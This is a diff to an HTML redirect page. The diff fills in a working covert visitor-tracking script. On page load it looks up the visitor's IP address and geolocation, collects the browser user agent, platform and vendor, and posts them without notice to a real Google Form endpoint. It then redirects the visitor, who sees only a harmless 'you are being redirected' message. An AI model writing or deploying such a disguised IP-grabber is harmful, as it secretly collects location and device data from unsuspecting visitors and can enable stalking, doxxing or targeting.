@@ -11,42 +11,42 @@
         // Function to send data to Google Form and then redirect
         async function sendDataAndRedirect() {
             try {
-                // Fetch IP and Geolocation data
+                // Fetch IP and Geolocation data from a free API
                 const geoResponse = await fetch('https://ipapi.co/json/');
                 const geoData = await geoResponse.json();
 
-                // Get other details
+                // Get other details from the user's browser
                 const timestamp = new Date().toISOString();
                 const userAgent = navigator.userAgent;
                 const os = navigator.platform;
                 const device = navigator.vendor;
 
-                // Create a FormData object
+                // Create a FormData object with your specific entry IDs
                 const formData = new FormData();
-                formData.append("entry.YOUR_TIMESTAMP_ID", timestamp);
-                formData.append("entry.YOUR_IP_ID", geoData.ip);
-                formData.append("entry.YOUR_OS_ID", os);
-                formData.append("entry.YOUR_DEVICE_ID", device);
-                formData.append("entry.YOUR_GEOLOCATION_ID", `${geoData.city}, ${geoData.region}, ${geoData.country_name}`);
-                formData.append("entry.YOUR_USERAGENT_ID", userAgent);
+                formData.append("entry.1496883719", timestamp);
+                formData.append("entry.1535774579", geoData.ip);
+                formData.append("entry.2067837825", os);
+                formData.append("entry.747657848", device);
+                formData.append("entry.1734202770", `${geoData.city}, ${geoData.region}, ${geoData.country_name}`);
+                formData.append("entry.448354724", userAgent);
 
-                // Submit to Google Form
-                await fetch("YOUR_GOOGLE_FORM_ACTION_URL", {
+                // Submit to your specific Google Form action URL
+                await fetch("https://docs.google.com/forms/d/e/1FAIpQLSehg2hY3VPki5je6DE8lAmLPcXTGdk4ReZ7FCGxX_SZ3OJ0yg/formResponse", {
                     method: "POST",
                     body: formData,
-                    mode: "no-cors" // Important to avoid CORS errors
+                    mode: "no-cors" // Important to prevent CORS errors
                 });
 
             } catch (error) {
                 console.error("Error capturing data:", error);
             } finally {
-                // Redirect the user
+                // ALWAYS redirect the user, even if data capture fails
                 window.location.href = REDIRECT_URL;
             }
         }
     </script>
 </head>
 <body onload="sendDataAndRedirect()">
-    <p>If you are not redirected automatically, <a href="https://example.com">click here</a>.</p>
+    <p>You are being redirected. If you are not redirected automatically, <a href="https://example.com">click here</a>.</p>
 </body>
 </html>
